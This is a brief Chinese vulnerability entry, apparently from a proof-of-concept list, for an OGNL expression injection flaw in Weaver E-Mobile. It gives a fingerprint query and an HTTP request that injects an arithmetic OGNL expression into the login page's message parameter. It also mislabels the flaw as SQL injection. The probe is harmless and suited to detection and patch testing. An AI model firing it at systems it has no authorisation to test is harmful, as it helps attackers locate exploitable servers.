# 泛微E-Mobile存在Ognl表达式注入漏洞

泛微OA ｜ SQL注入 ｜ —
- **指纹**：`body="serverTitle"`
- **请求**：`GET /login.do?message=%24%7B3.1415%2a3.1415%7D%0A HTTP/1.1`
- **响应特征**：200